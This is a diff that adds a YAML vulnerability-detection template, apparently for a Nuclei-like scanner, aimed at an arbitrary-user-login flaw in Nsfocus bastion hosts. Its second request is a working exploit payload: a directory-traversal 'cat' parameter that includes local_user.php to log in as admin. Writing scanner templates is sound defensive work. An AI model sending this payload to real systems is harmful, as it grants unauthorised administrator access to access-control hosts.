@@ -1,0 +1,31 @@
+id: nsfocus-auth-bypass
+brief:
+    title: Nsfocus - Arbitrary User Login
+    by: ritikchaddha
+    level: high
+    about: Nsfocus bastion host has an arbitrary user login vulnerability. Attackers can use the vulnerability to log in any user by including www/local_user.php
+    label:
+        - nsfocus
+        - auth-bypass
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - 'status": 200'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
